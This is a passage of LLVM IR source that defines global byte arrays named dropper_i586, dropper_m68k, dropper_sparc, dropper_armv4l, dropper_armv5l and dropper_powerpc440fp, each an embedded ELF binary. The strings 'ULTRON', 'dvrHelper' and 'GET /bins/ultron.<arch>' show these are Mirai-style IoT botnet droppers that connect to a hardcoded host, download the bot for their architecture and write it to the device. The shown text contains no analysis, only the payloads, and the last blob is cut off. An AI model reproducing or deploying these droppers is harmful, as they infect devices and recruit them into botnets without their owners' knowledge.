HTTP/1.0\0D\0A\0D\0A\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.sbss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\10\01\04\A4\00\00\04\A4\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\A4\00\00\00\1F\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_i586 = global [2 x i8*] [i8* getelementptr inbounds ([1197 x i8], [1197 x i8]* @.str.270, i32 0, i32 0), i8* null], align 16
@.str.270 = private unnamed_addr constant [1197 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\03\00\01\00\00\00$\83\04\084\00\00\00\E4\03\00\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\04\08\00\80\04\08\C1\03\00\00\C1\03\00\00\05\00\00\00\00\10\00\00\01\00\00\00\C4\03\00\00\C4\93\04\08\C4\93\04\08\00\00\00\00\04\00\00\00\06\00\00\00\00\10\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\00\00\00U\89\E5\0F\B6U\08\0F\B6E\0C\C1\E2\18\C1\E0\10\09\C2\0F\B6M\10\0F\B6E\14\C1\E1\08\09\C2\09\D1]\89\CA\89\C8\C1\E0\18\81\E2\00\FF\00\00\C1\E2\08\09\D0\89\CA\C1\EA\18\81\E1\00\00\FF\00\C1\E9\08\09\CA\09\D0\C3U\89\E5\83\EC\10\FFu\08j\01\E8D\02\00\00\83\C4\10\C9\C3U\89\E5\83\EC\10\FFu\08j\06\E8/\02\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\05\E8\17\02\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\03jf\E8\F0\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\04\E8\D8\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\03\E8\C0\01\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\01jf\E8\99\01\00\00\C9\C3U\B8}\83\04\08\89\E5WVS\81\EC\AC\00\00\00\EB\01@\808\00u\FA-}\83\04\08\89\85P\FF\FF\FFPj\07h\82\83\04\08j\01\E8v\FF\FF\FFh\D9\00\00\00f\C7E\E0\02\00jRf\C7E\E2\00Ph\EB\00\00\00h\A8\00\00\00\E8\A6\FE\FF\FF\83\C4\1C\89E\E4h\FF\01\00\00hA\02\00\00h\8A\83\04\08\E8\FB\FE\FF\FF\83\C4\0C\89\C7j\00j\01j\02\E8Z\FF\FF\FF\83\C4\10\89\C6\83\F8\FFt\05\83\FF\FFu\0D\83\EC\0Cj\01\E8\AB\FE\FF\FF\83\C4\10P\8DE\E0j\10PV\E8\DA\FE\FF\FF\83\C4\10\89\C3\85\C0y\1C\F7\DBPj\04h\94\83\04\08j\01\E8\E7\FE\FF\FF\89\1C$\E8y\FE\FF\FF\83\C4\10\8B\9DP\FF\FF\FFP\83\C3\1DSh\99\83\04\08V\E8\C6\FE\FF\FF\83\C4\109\D8t\0D\83\EC\0Cj\03\E8O\FE\FF\FF\83\C4\101\DBP\8DE\F3j\01PV\E8\BB\FE\FF\FF\83\C4\10Ht\0D\83\EC\0Cj\04\E8-\FE\FF\FF\83\C4\10\0F\BEE\F3\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\CF\8D\9D`\FF\FF\FFQh\80\00\00\00SV\E8\84\FE\FF\FF\83\C4\10\85\C0~\0ERPSW\E8\5C\FE\FF\FF\83\C4\10\EB\D8\83\EC\0CV\E8\FD\FD\FF\FF\89<$\E8\F5\FD\FF\FF\83\C4\0Cj\04h\BC\83\04\08j\01\E85\FE\FF\FF\C7\04$\05\00\00\00\E8\C3\FD\FF\FF\83\C4\10\8De\F4[^_]\C3U\89\E5]\E9l\FE\FF\FF\90\90\90UWVS\8Bl$,\8B|$(\8Bt$$\8BT$ \8BL$\1C\8B\5C$\18\8BD$\14\CD\80[^_]=\01\F0\FF\FF\0F\83\01\00\00\00\C3\83\EC\0C\89\C2\F7\DA\E8\09\00\00\00\89\10\83\C8\FF\83\C4\0C\C3\B8\C4\93\04\08\C3i586\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.i586 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\94\80\04\08\94\00\00\00\E9\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00}\83\04\08}\03\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\C4\93\04\08\C4\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\C4\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_m68k = global [2 x i8*] [i8* getelementptr inbounds ([1253 x i8], [1253 x i8]* @.str.271, i32 0, i32 0), i8* null], align 16
@.str.271 = private unnamed_addr constant [1253 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\04\00\00\00\01\80\00\03>\00\00\004\00\00\04\1C\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\80\00\00\00\80\00\00\00\00\00\03\FC\00\00\03\FC\00\00\00\05\00\00 \00\00\00\00\01\00\00\03\FC\80\00#\FC\80\00#\FC\00\00\00\00\00\00\00\08\00\00\00\06\00\00 \00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04NV\00\00\12.\00\0Bp\18\E1\A9B\80\10.\00\0FH@B@\82\80\82.\00\17B\80\10.\00\13\E1\88\80\81N^NuNV\00\00/.\00\08Hx\00\01a\FF\00\00\02\80P\8FN^NuNV\00\00/.\00\08Hx\00\06a\FF\00\00\02hN^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\05a\FF\00\00\02JN^NuNV\FF\F4-n\00\08\FF\F4-n\00\0C\FF\F8-n\00\10\FF\FCHn\FF\F4Hx\00\03Hx\00fa\FF\00\00\02\1EN^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\04a\FF\00\00\02\00N^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\03a\FF\00\00\01\E2N^NuNV\FF\F4-n\00\08\FF\F4-n\00\0C\FF\F8-n\00\10\FF\FCHn\FF\F4Hx\00\01Hx\00fa\FF\00\00\01\B6N^NuNV\FFlH\E780E\F9\80\00\03\B8`\02R\8AJ\12f\FA\95\FC\80\00\03\B8Hx\00\07Hy\80\00\03\BDHx\00\01a\FF\FF\FF\FFl=|\00\02\FF\EE=|\00P\FF\F0Hx\00\D9Hx\00RHx\00\EBHx\00\A8a\FF\FF\FF\FE\A8O\EF\00\10-@\FF\F2Hx\01\FFHx\02AHy\80\00\03\C5a\FF\FF\FF\FE\E4(\00B\A7Hx\00\01Hx\00\02a\FF\FF\FF\FFX&\00O\EF\00$p\FF\B0\83g\04\B0\84f\0CHx\00\01a\FF\FF\FF\FE\8AX\8FHx\00\10Hn\FF\EE/\03a\FF\FF\FF\FE\C4$\00O\EF\00\0Cl\22Hx\00\04Hy\80\00\03\CFHx\00\01a\FF\FF\FF\FE\D4D\82/\02a\FF\FF\FF\FERO\EF\00\10E\EA\00\1D/\0AHy\80\00\03\D4/\03a\FF\FF\FF\FE\B2O\EF\00\0C\B5\C0g\0CHx\00\03a\FF\FF\FF\FE(X\8FB\82Hx\00\01Hn\FF\FF/\03a\FF\FF\FF\FE\AAO\EF\00\0Cr\01\B2\80g\0CHx\00\04a\FF\FF\FF\FE\00X\8F\E1\8A\10.\FF\FFI\C0\84\80\0C\82\0D\0A\0D\0Af\C8Hx\00\80$\0E\06\82\FF\FF\FFn/\02/\03a\FF\FF\FF\FElO\EF\00\0CG\F9\80\00\016J\80o\0E/\00/\02/\04N\93O\EF\00\0C`\CE/\03E\F9\80\00\00\D6N\92/\04N\92Hx\00\04Hy\80\00\03\F7Hx\00\01N\93Hx\00\05a\FF\FF\FF\FD\92O\EF\00\18L\EE\0C\1C\FFXN^NuNV\00\00a\FF\FF\FF\FEZN^NuNV\FF\F8H\E7<\00 n\00 *.\00\1C(.\00\18&.\00\14$.\00\10\22.\00\0C .\00\08N@-@\FF\F8 .\FF\F8r\82\B2\80d\1A .\FF\F8D\80-@\FF\FCa\FF\00\00\00\1C \AE\FF\FCr\FF-A\FF\F8 .\FF\F8L\EE\00<\FF\E8N^NuNV\00\00 <\80\00#\FC @N^Num68k\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.m68k HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\80\00\00\94\00\00\00\94\00\00\03$\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\80\00\03\B8\00\00\03\B8\00\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\80\00#\FC\00\00\03\FC\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\03\FC\00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_sparc = global [2 x i8*] [i8* getelementptr inbounds ([1289 x i8], [1289 x i8]* @.str.272, i32 0, i32 0), i8* null], align 16
@.str.272 = private unnamed_addr constant [1289 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\02\00\00\00\01\00\01\03h\00\00\004\00\00\04@\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\00\01\00\00\00\01\00\00\00\00\04 \00\00\04 \00\00\00\05\00\01\00\00\00\00\00\01\00\00\04 \00\02\04 \00\02\04 \00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\96\0A\E0\FF\91* \18\92\0A`\FF\94\0A\A0\FF\93*`\10\95*\A0\08\90\12\00\09\90\12\00\0B\81\C3\E0\08\90\12\80\08\92\10\00\08\90\10 \01\82\13\C0\00\10\80\00\AC\01\00\00\00\01\00\00\00\92\10\00\08\90\10 \06\82\13\C0\00\10\80\00\A6\01\00\00\00\01\00\00\00\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \05\82\13\C0\00\10\80\00\9D\01\00\00\00\01\00\00\00\9D\E3\BF\88\92\10 \03\F0'\BF\EC\F2'\BF\F0\F4'\BF\F4\94\07\BF\EC@\00\00\94\90\10 \CE\81\C7\E0\08\91\E8\00\08\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \04\82\13\C0\00\10\80\00\8A\01\00\00\00\01\00\00\00\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \03\82\13\C0\00\10\80\00\81\01\00\00\00\01\00\00\00\9D\E3\BF\88\92\10 \01\F0'\BF\EC\F2'\BF\F0\F4'\BF\F4\94\07\BF\EC@\00\00x\90\10 \CE\81\C7\E0\08\91\E8\00\08\9D\E3\BF\00\03\00\00@\A0\10c\C8\C2L\00\00\80\A0`\002\BF\FF\FE\A0\04 \01\03\00\00@\82\10c\C8\94\10 \07\A6$\00\01\90\10 \01\13\00\00@\7F\FF\FF\D7\92\12c\D0\82\10 \02\C27\BF\E4\82\10 P\96\10 \D9\C27\BF\E6\92\10 \EB\94\10 R\7F\FF\FF\A5\90\10 \A8\92\10&\01\D0'\BF\E8\94\10!\FF\11\00\00@\7F\FF\FF\B5\90\12#\D8\92\10 \01\A4\10\00\08\94\10 \00\7F\FF\FF\D5\90\10 \02\80\A2?\FF\02\80\00\05\A2\10\00\08\80\A4\BF\FF\12\80\00\05\90\10\00\11\7F\FF\FF\9C\90\10 \01\90\10\00\11\92\07\BF\E4\7F\FF\FF\AD\94\10 \10\A0\92 \006\80\00\0A\A0\04\E0\1D\90\10 \01\13\00\00@\94\10 \04\7F\FF\FF\AF\92\12c\E8\7F\FF\FF\8E\90 \00\10\A0\04\E0\1D\90\10\00\11\13\00\00@\94\10\00\10\7F\FF\FF\A7\92\12c\F0\80\A2\00\10\02\80\00\05\A0\10 \00\7F\FF\FF\83\90\10 \03\A0\10 \00\92\07\BF\F7\94\10 \01\7F\FF\FF\A6\90\10\00\11\80\A2 \01\02\80\00\05\C2O\BF\F7\7F\FF\FFy\90\10 \04\C2O\BF\F7\85, \08\A0\10\80\01\03\03B\83\82\10a\0A\80\A4\00\01\12\BF\FF\F2\92\07\BF\F7\A0\07\BFd\90\10\00\11\92\10\00\10\7F\FF\FF\94\94\10 \80\80\A2 \00\04\80\00\07\94\10\00\08\92\10\00\10\7F\FF\FF\85\90\10\00\12\10\BF\FF\F6\A0\07\BFd\7F\FF\FFh\90\10\00\11\7F\FF\FFf\90\10\00\12\94\10 \04\90\10 \01\13\00\00A\7F\FF\FFz\92\12`\18\7F\FF\FFY\90\10 \05\81\C7\E0\08\81\E8\00\00\82\13\C0\00\10\BF\FF\8F\01\00\00\00\01\00\00\00\82\10\00\08\90\10\00\09\92\10\00\0A\94\10\00\0B\96\10\00\0C\98\10\00\0D\91\D0 \10\0A\80\00\04\01\00\00\00\81\C3\E0\08\01\00\00\00\9D\E3\BF\98@\00\00\05\01\00\00\00\F0\22\00\00\81\C7\E0\08\91\E8?\FF\11\00\00\81\81\C3\E0\08\90\12  spc\00\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00\00\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.spc HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\01\00\94\00\00\00\94\00\00\034\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\01\03\C8\00\00\03\C8\00\00\00X\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\02\04 \00\00\04 \00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04 \00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_armv4l = global [2 x i8*] [i8* getelementptr inbounds ([1177 x i8], [1177 x i8]* @.str.273, i32 0, i32 0), i8* null], align 16
@.str.273 = private unnamed_addr constant [1177 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\1C\83\00\004\00\00\00\D0\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\B0\03\00\00\B0\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00\B0\03\00\00\B0\03\01\00\B0\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\97\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\93\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1\8C\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5\84\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1{\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1t\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5l\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9tA\9F\E5\94\D0M\E2\00\00\00\EA\01@\84\E2\00`\D4\E5\00\00V\E3\FB\FF\FF\1AX1\9F\E5X\11\9F\E5\07 \A0\E3\01\00\A0\E3\04\80c\E0\D9\FF\FF\EB\02@\A0\E3P\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\A8\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A5\FF\FF\EB\1C\11\9F\E5\84\00\8D\E5\18!\9F\E5\18\01\9F\E5\B8\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\A6\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B1\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D0\10\9F\E5\04 \A0\E3\B5\FF\FF\EB\00\00d\E2\9A\FF\FF\EB\1D@\88\E2\05\00\A0\E1\B8\10\9F\E5\04 \A0\E1\AE\FF\FF\EB\04\00P\E1\03\00\A0\13\92\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\AD\FF\FF\EB\01\00P\E3\04\00\A0\E3\8A\FF\FF\1B\930\DD\E5\04D\83\E1|0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\A1\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1|\FF\FF\EB\07\00\A0\E1z\FF\FF\EB8\10\9F\E5\04 \A0\E3\01\00\A0\E3\8B\FF\FF\EB\05\00\A0\E3p\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\5C\83\00\00d\83\00\00A\02\00\00\FF\01\00\00l\83\00\00x\83\00\00\80\83\00\00\0A\0D\0A\0D\A8\83\00\00\95\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1\B0\03\01\00armv4l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv4l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\E8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\5C\83\00\00\5C\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\B0\03\01\00\B0\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B0\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_armv5l = global [2 x i8*] [i8* getelementptr inbounds ([1177 x i8], [1177 x i8]* @.str.274, i32 0, i32 0), i8* null], align 16
@.str.274 = private unnamed_addr constant [1177 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\1C\83\00\004\00\00\00\D0\03\00\00\02\00\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\B0\03\00\00\B0\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00\B0\03\00\00\B0\03\01\00\B0\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\97\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\93\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1\8C\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5\84\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1{\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1t\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5l\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9tA\9F\E5\94\D0M\E2\00\00\00\EA\01@\84\E2\00`\D4\E5\00\00V\E3\FB\FF\FF\1AX1\9F\E5X\11\9F\E5\07 \A0\E3\01\00\A0\E3\04\80c\E0\D9\FF\FF\EB\02@\A0\E3P\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\A8\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A5\FF\FF\EB\1C\11\9F\E5\84\00\8D\E5\18!\9F\E5\18\01\9F\E5\B8\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\A6\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B1\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D0\10\9F\E5\04 \A0\E3\B5\FF\FF\EB\00\00d\E2\9A\FF\FF\EB\1D@\88\E2\05\00\A0\E1\B8\10\9F\E5\04 \A0\E1\AE\FF\FF\EB\04\00P\E1\03\00\A0\13\92\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\AD\FF\FF\EB\01\00P\E3\04\00\A0\E3\8A\FF\FF\1B\930\DD\E5\04D\83\E1|0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\A1\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1|\FF\FF\EB\07\00\A0\E1z\FF\FF\EB8\10\9F\E5\04 \A0\E3\01\00\A0\E3\8B\FF\FF\EB\05\00\A0\E3p\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\5C\83\00\00d\83\00\00A\02\00\00\FF\01\00\00l\83\00\00x\83\00\00\80\83\00\00\0A\0D\0A\0D\A8\83\00\00\95\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1\B0\03\01\00armv5l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv5l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\E8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\5C\83\00\00\5C\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\B0\03\01\00\B0\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B0\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_powerpc440fp = global i8* getelementptr inbounds ([2534 x i8], [2534 x i8]* @.str.275, i32 0, i32 0), align 8
@.str.275 = private unnamed_addr constant [2534 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\14\00\00\00\01\10\00\03\E8\00\00\004\00\00\050\00\00\00\00\004\00 \00\03\00(\00\08\00\05\00\00\00\01\00\00\00\00\10\00\00\00\10\00\00\00\00\00\04\B0\00\00\04\B0\00\00\00\05\00\01\00\00\00\00\00\01\00\00\04\B0\10\01\04\B0\10\01\04\B0\00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04T\84\80\1ETc\C0\0E|c#xT\A5@.|c3x|\A3\1BxN\80\00 \94!\FF\F0|\08\02\A6|d\1Bx8`\00\01\90\01\00\14L\C61\82H\00\03%\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|d\1Bx8`\00\06\90\01\00\14L\C61\82H\00\02\F9\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\05L\C61\82H\00\02\C1\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\03\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\02\85\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\04L\C61\82H\00\02M\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\03L\C61\82H\00\02\15\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\01\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\01\D9\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF@|\08\02\A6= \10\00\BF\81\00\B0;\A9\04P\90\01\00\C4H\00\00\08;\BD\00\01\88\1D\00\00/\80\00\00@\9E\FF\F4<\80\10\00= \10\009)\04P8\84\04`8\A0\00\078`\00\01\7F\A9\E8PK\FF\FF\0D8\00\00\028\C0\00\D98\80\00\EB8\A0\00R\B0\01\00\0C8`\00\A88\00\00P\B0\01\00\0EK\FF\FE\01\90a\00\10<`\10\008\80\02A8\A0\01\FF8c\04hK\FF\FE]8\80\00\01||\1Bx8\A0\00\008`\00\02K\FF\FF-/\83\FF\FF|~\1BxA\9E\00\0C/\9C\FF\FF@\BE\00\0C8`\00\01K\FF\FD\D5\7F\C3\F3x8\81\00\0C8\A0\00\10K\FF\FEU|\7F\1By@\A0\00 